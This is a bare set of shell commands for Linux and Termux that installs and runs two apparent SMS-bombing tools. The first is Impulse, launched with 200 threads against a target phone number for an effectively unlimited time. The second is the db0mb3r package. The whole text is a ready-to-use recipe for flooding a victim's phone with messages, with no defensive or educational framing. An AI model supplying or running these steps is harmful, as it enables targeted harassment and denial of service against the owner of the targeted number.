==========FIRST-METHOD==========


-=-=-=-=-=-=LINUX=-=-=-=-=-=-

$ apt update
$ apt install python3 git python3-pip -y
$ cd
$ git clone https://github.com/Limerboy/Impulse
$ cd Impulse
$ pip3 install -r requirements.txt
$ python3 impulse.py --method SMS --threads 200 --time 9999999 --target number

-=-=-=-=-=-=TERMUX=-=-=-=-=-=-

$ pkg update -y
$ pkg install python3 git python3 -y
$ cd
$ git clone https://github.com/Limerboy/Impulse
$ cd Impulse
$ pip3 install -r requirements.txt
$ python3 impulse.py --method SMS --threads 200 --time 9999999 --target number


==========SECOND-METHOD==========


-=-=-=-=-=-=LINUX=-=-=-=-=-=-

$ apt update
$ apt install python3 python3-pip git make clang automake autoconf -y
$ pip3 install db0mb3r
$ db0mb3r

-=-=-=-=-=-=TERMUX=-=-=-=-=-=-

$ pkg update -y
$ pkg install python3 git make clang automake autoconf -y
$ pip3 install db0mb3r
$ db0mb3r
